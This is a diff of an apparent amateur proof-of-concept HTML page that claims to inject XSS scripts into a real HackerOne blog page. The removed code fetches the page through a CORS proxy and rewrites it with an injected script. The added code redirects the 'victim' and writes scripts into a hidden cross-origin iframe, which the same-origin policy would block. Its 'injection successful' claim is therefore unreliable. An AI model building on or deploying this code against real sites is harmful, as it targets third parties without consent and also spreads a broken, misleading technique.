@@ -2,41 +2,62 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to POC Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            color: red;
+        }
+        p {
+            color: black;
+        }
+        button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
+    <h1>Welcome to My POC by Lordsa</h1>
+    <p>This page demonstrates a proof-of-concept for testing vulnerability in websites.</p>
+    <p>You are being redirected to an external site to simulate a vulnerable site.</p>
+    <button onclick="redirectAndInject()">Redirect</button>
     <script>
-        // URL الموقع الخارجي الذي تريد تحويل الزائر إليه عبر بروكسي CORS
-        var targetUrl = 'https://www.hackerone.com/hackerone-community-blog/hack-hard-have-fun-increase-security';
-        var proxyUrl = 'https://cors-anywhere.herokuapp.com/' + targetUrl;
-
-        // الكود الذي سيتم حقنه في الصفحة الهدف
-        var payload = '<script>alert("This site is vulnerable to self-XSS!");<\/script>';
-
-        // دالة لتحويل الزائر وإضافة الكود
         function redirectAndInject() {
-            fetch(proxyUrl)
-                .then(response => response.text())
-                .then(data => {
-                    // حقن الكود في محتوى الصفحة الهدف
-                    var modifiedContent = data.replace('</body>', payload + '</body>');
+            // Redirect the victim to the external site
+            window.location.href = 'https://www.hackerone.com/hackerone-community-blog/hack-hard-have-fun-increase-security?query=a:2';
 
-                    // إنشاء عنصر جديد لعرض المحتوى المعدل
-                    var newWindow = window.open('', '_blank');
-                    newWindow.document.open();
-                    newWindow.document.write(modifiedContent);
-                    newWindow.document.close();
+            // Add DOM XSS code to the external page
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://www.hackerone.com/hackerone-community-blog/hack-hard-have-fun-increase-security?query=a:2';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
 
-                    // إعادة توجيه الزائر إلى الصفحة الهدف بعد حقن الكود
-                    window.location.href = targetUrl;
-                })
-                .catch(error => {
-                    console.error('Error fetching the target page:', error);
-                });
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            iframeDoc.open();
+            iframeDoc.write('<script>window.codeActivated = true;</' + 'script>');
+            iframeDoc.write('<script>window.onload = function() { alert("DOM XSS has been activated!"); };</' + 'script>');
+            iframeDoc.close();
+
+            // Check if the external page has been injected successfully
+            const checkInterval = setInterval(() => {
+                if (window.codeActivated) {
+                    clearInterval(checkInterval);
+                    alert("External page injection successful!");
+                }
+            }, 100);
         }
-
-        // بدء عملية التحويل والحقن عند تحميل الصفحة
-        redirectAndInject();
     </script>
 </body>
 </html>
